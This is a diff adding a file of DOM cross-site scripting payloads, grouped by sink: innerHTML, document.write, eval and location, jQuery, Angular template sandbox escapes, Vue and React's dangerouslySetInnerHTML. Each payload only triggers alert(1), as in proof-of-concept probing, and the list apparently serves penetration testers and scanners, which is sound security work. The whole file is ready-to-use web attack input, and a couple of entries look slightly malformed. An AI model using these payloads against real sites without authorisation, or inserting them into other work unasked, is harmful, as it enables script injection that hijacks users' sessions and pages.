@@ -1,0 +1,31 @@
+# DOM XSS Payloads
+# These exploit client-side JS sinks: innerHTML, document.write, eval, etc.
+
+# innerHTML sink
+#"><img src=x onerror=alert(1)>
+#'><img src=x onerror=alert(1)>
+</textarea><img src=x onerror=alert(1)>
+
+# document.write sink
+</script><script>alert(1)</script>
+<svg onload=alert(1)>
+
+# eval/location sink
+javascript:alert(1)
+'-alert(1)-'
+\"-alert(1)-\"
+{{constructor.constructor('alert(1)')()}
+
+# jQuery sink
+$('<img/src/onerror=alert(1)>')
+$('.class').html('<img src=x onerror=alert(1)>')
+
+# Angular sandbox escape
+{{$on.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+
+# Vue
+{{_constructor.constructor('alert(1)')()}}
+
+# React (if dangerouslySetInnerHTML used)
+<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} />
